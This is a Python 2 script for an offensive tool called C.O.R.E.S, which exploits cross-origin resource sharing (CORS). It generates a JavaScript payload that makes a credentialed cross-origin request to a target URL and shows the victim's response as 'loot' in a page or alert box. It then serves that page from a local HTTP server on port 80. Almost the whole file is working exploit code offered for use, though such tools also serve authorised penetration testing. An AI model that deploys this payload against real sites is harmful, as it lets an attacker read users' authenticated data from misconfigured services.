#!/usr/bin/env python2
# C.O.R.E.S
# Cross-Origin Resource Exploitation Server
try:
	import sys
	import os
	import time
	import argparse
	from argparse import RawTextHelpFormatter
	# IP Query
	import json, urllib, socket
	# Simple HTTP Server
	import SocketServer, SimpleHTTPServer, multiprocessing
	# Custom theme
	from theme import *
except Exception as e:
	print('\n' + string(e))
	sys.exit(1)

App = ' CORES '
Version = 'v1.03282017'
Author = 'Nick Sanzotta/@Beamr'
Contributors = ''

def parse_args():
	''' CLI Argument Options'''
	cls()
	# Create Parser
	parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, description=' '+
		str(banner(App, Version, Author, Contributors)) +
        ' Usage: python cores.py <URL> <OPTIONS> \n' +
        ' Example[1]: python cores.py https://target-site.com/\n' +
        ' Example[2]: python cores.py https://target-site.com/ -m GET -s html -v\n')	
	# Positional Arguments
	url_group = parser.add_argument_group(colors.green + ' URL options' + colors.normal)
	url_group.add_argument('url', type=str, metavar='', #required=True,
		help='<Target URL>  ex: https://target-site.com/')
	url_group.add_argument('-m', type=str, metavar='', #required=True,
		help='<HTTP Method> ex: https://target-site.com/ -m GET\n')
	# Style Arguments
	style_group = parser.add_argument_group(colors.green + ' Style options' + colors.normal)
	style_group.add_argument('-s', type=str, metavar='', #required=True,
		help='EX: -s html   Displays loot inside HTML.\n'+
			 'EX: -s alert  Displays loot inside and Alert box.')
	# ME/Verbose Arguments
	group = parser.add_mutually_exclusive_group()
	group.add_argument('-v','--verbose',action='store_true',
		help='Turn on Verbosity\n')
	# Parse the Arguments
	args = parser.parse_args()
	# Defaults
	if not args.m:
	    args.m = 'GET'
	elif not args.s:
		args.s = 'alert'
	#
	return args

def dir_check(directory):
	''' If specified directory does not exists then create specified directory '''
	if not os.path.exists(directory):
		print(' ['+colors.red +'!'+colors.normal+']'+' Directory not found: ' + directory) 
		os.makedirs(directory)
		print(' ['+colors.green +'*'+colors.normal+']'+' Created Directory: ' + directory)	

def get_external_address():
	''' Obtains External IP Address '''
	data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
	return data["ip"]

def get_internal_address():
	''' Obtains Internal IP Address '''
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	return s.getsockname()[0]

def cors_js_template(style, method, url, filename):
	'''1. Create CORS template for JavaScript Payload '''
	'''2. Write CORS template to file '''
	if style == 'html':
		cors_js_template = """
		var req = new XMLHttpRequest();
		req.onload = reqListener;
		req.open('{0}','{1}',true);
		req.withCredentials = true;
		req.send();
		function reqListener() {{
		 	document.getElementById("loot").innerHTML = (this.responseText);
		 }};"""
	else:
		cors_js_template = """
		var req = new XMLHttpRequest();
		req.onload = reqListener;
		req.open('{0}','{1}',true);
		req.withCredentials = true;
		req.send();
		function reqListener() {{
		 	window.alert(this.responseText);
		 }};"""
	cors_js = cors_js_template.format(method, url)
	with open(filename, 'w+') as f1:
		f1.write(cors_js)
	return cors_js

def html_template(javascript, filename):
	'''1. Create HTML template for index.html '''
	'''2. Write index.html to file '''
	filename = 'index.html'
	html_template = """
	<!DOCTYPE HTML>
	<html lang="en-US">
	<title>C.O.R.E.S</title>
	<head></head>
  		<body>
  			<p style="margin-left: 55px">
  			<b>Cross-Origin Resource Exploitation Server</b><br>
 			CORES {0}<br>
 			Description:Cross-Origin Resource Exploitation Server.<br>
 			Created by: Nick Sanzotta/@Beamr<br>
 			Contributors: {1}</p><br>
  			
  			<p style="margin-left: 55px">
  			<b>Loot:</b></p>
			<p style="margin-left: 55px", id="loot"></p>
				<script src="js/cors.js"></script>
		</body>
  	</html>"""
  	html_indexPage = html_template.format(Version, Contributors)
  	with open(filename, 'w+') as f2:
  		f2.write(html_indexPage)
  	return html_indexPage

# def server_stop():
# 	'''1. Stops Python's SimpleHTTPServer '''
# 	try:
# 		httpd.shutdown()
# 		httpd.server_close()
# 	except Exception:
# 		traceback.print_exc(file=sys.stdout)

def server_start(port):
	'''1. Starts Python's SimpleHTTPServer on specified port'''
	httpPort = port
	Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
	httpd = SocketServer.TCPServer(("",httpPort), Handler)
	server_process = multiprocessing.Process(target=httpd.serve_forever)
	# Daemon True will stop the server once the script completes.
	server_process.daemon = False
	server_process.start()
	print(blue('*')+ 'HTTP Server started on Port: ' + str(httpPort))


def main():
	# Banner
	cls()
	banner(App, Version, Author, Contributors)
	# Staging variables for JS
	js_name = 'cors.js'
	js_dir = str(os.path.expanduser('js/'))
	js_path = os.path.join(js_dir, js_name)
	# Check for js dir
	dir_check(js_dir)
	# Staging variables for HTML
	html_name = 'index.html'
	html_dir = str(os.path.expanduser(''))
	html_path = os.path.join(html_dir, html_name)	
	# return args
	args = parse_args()
	
	# Attempt to Obtain External IP Address
	try:
		extipAddress = get_external_address()
	except IOError:
		print(red('!')+ 'Check your Internet connection')
		pass #CHECK
	# Obtain Internal IP Address	
	ipAddress = get_internal_address()
	
	# Create payload file
	cors_js = cors_js_template(args.s, args.m, args.url, js_path)
	html_indexPage = html_template(cors_js, html_path)

	# Check for (-v)erbose
	if args.verbose:
		print(html_indexPage)
	else:
		pass

	# Start HTTP Server
	server_start(80)
	print(blue('i')+ 'Target URL:  '+ args.url)
	print(blue('i')+ 'HTTP Server: http://'+ipAddress+'/index.html')
	print('\n')

if __name__ == "__main__":
	try:
		main()
	except (KeyboardInterrupt, SystemExit):
		raise
	except:
		print(red('!')+'HTTP Server is still running, wait an try again.')
		pass
		# report error and proceed
